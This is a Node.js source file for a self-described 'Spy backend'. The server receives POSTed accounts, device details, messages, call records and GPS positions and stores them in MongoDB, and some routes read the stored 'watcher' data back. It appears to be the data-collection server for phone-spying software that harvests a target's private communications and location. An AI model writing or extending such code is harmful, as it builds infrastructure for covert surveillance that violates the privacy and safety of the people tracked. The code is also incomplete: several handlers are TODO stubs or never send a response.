var http = require('http');
var mongo = require( './utils/mongoUtils' );
var url = require('url');
var assert = require('assert');

const LISTEN_PORT=9900;

var server = http.createServer(handleRequest).listen(
    LISTEN_PORT,
    function(){
        console.log("Server listening on: http://localhost:%s", LISTEN_PORT);
    }
);

function handleRequest(request, response){
    switch (request.url) {
        case '/' :
            response.end('Spy backend welcomes you');
            break;
        case '/accounts' :
            if (isPost(request)) {
                processPostRequest(request, response, 'accounts');
            } else {
                // TODO
            }
            break;
        case '/devices' :
            if (isPost(request)) {
                processPostRequest(request, response, 'devices');
            } else {
                // TODO
            }
            break;
        case '/messages' :
            if (isPost(request)) {
                processPostRequest(request, response, 'messages');
            } else if (isGet(request)) {
                mongo.getWatcherData(url.parse(request.url, true), 'messages');
            }
            break;
        case '/calls' :
            if (isPost(request)) {
                processPostRequest(request, response, 'calls');
            } else if (isGet(request)) {
                mongo.getWatcherData(url.parse(request.url, true), 'calls');
            }
            break;
        case '/gps' :
            if (isPost(request)) {
                processPostRequest(request, response, 'gps');
            } else if (isGet(request)) {
                mongo.getWatcherData(url.parse(request.url, true), 'gps');
            }
            break;
        default :

    }
}

function isPost(request) {
    return request.method == 'POST';
}

function isGet(request) {
    return request.method == 'GET';
}

function processPostRequest(request, response, collection) {
    console.log(request.method + " to " + request.url);
    var data = '';
    request.on('data', function (chunk) {
        console.log(chunk.toString());
        data += chunk;
    });
    request.on('end', function () {
        mongo.storeData(JSON.parse(data), collection,
            function () {
                response.writeHead(200, "OK", {'Content-Type': 'text/html'});
                response.end();
            },
            function(error) {
                console.log("Error while adding to " + collection + ": " + error);
                response.writeHead(500, "Error", {'Content-Type': 'text/html'});
                response.end();
            });
    });
}

function methodNotSupported(request, response) {
    console.log("[405] " + request.method + " to " + request.url);
    response.writeHead(405, "Method not supported", {'Content-Type': 'text/html'});
    response.end('<html><head><title>405 - Method not supported</title></head><body><h1>Method not supported.</h1></body></html>');
}

function operationNotSupported(request, response) {
    console.log("[400] " + request.url);
    response.writeHead(400, "Operation not supported", {'Content-Type': 'text/html'});
    response.end('<html><head><title>400 - Operation not supported</title></head><body><h1>Operation not supported.</h1></body></html>');
}